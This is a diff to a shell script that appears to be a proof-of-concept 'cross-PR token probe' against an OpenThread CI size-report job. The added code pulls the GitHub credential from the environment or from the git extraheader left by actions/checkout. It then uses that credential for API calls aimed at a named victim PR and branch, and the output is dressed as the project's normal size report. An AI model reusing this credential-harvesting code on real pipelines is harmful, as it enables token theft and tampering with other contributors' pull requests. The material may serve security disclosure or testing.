@@ -34,9 +34,42 @@ TARGET_PR=2
 TARGET_BRANCH="ot001-victim-pr-20260303-102344"
 TARGET_FILE="OT001_VICTIM_20260303-102344.txt"
 API="https://api.github.com/repos/${GITHUB_REPOSITORY}"
-AUTH=(-H "Authorization: Bearer ${GITHUB_TOKEN}" -H "Accept: application/vnd.github+json")
 REPORT_DIR="/tmp/ot-size-report"
 REPORT_FILE="${REPORT_DIR}/report_pr"
+
+resolve_auth_header()
+{
+    if [ -n "${GITHUB_TOKEN:-}" ]; then
+        printf 'Authorization: Bearer %s' "${GITHUB_TOKEN}"
+        return 0
+    fi
+
+    local extraheader
+    extraheader="$(git config --get http.https://github.com/.extraheader || true)"
+    if [ -n "${extraheader}" ]; then
+        # actions/checkout sets: "AUTHORIZATION: basic <base64...>"
+        printf '%s' "${extraheader}" | sed 's/^AUTHORIZATION:/Authorization:/I'
+        return 0
+    fi
+
+    return 1
+}
+
+AUTH_HEADER="$(resolve_auth_header || true)"
+if [ -z "${AUTH_HEADER}" ]; then
+    mkdir -p "${REPORT_DIR}"
+    {
+        echo '<!-- Size Report of **OpenThread** -->'
+        echo 'OT-001 cross-PR token probe (safe demo)'
+        echo "Source PR: ${PR_NUMBER:-unknown}"
+        echo "Run ID: ${GITHUB_RUN_ID:-unknown}"
+        echo
+        echo "fatal: no auth header available in job context"
+    } > "${REPORT_FILE}"
+    exit 0
+fi
+
+AUTH=(-H "${AUTH_HEADER}" -H "Accept: application/vnd.github+json")
 
 mkdir -p "${REPORT_DIR}"
 {
@@ -44,6 +77,7 @@ mkdir -p "${REPORT_DIR}"
     echo 'OT-001 cross-PR token probe (safe demo)'
     echo "Source PR: ${PR_NUMBER:-unknown}"
     echo "Run ID: ${GITHUB_RUN_ID:-unknown}"
+    echo "Auth source: $([ -n "${GITHUB_TOKEN:-}" ] && echo env:GITHUB_TOKEN || echo git-extraheader)"
     echo
 } > "${REPORT_FILE}"
 
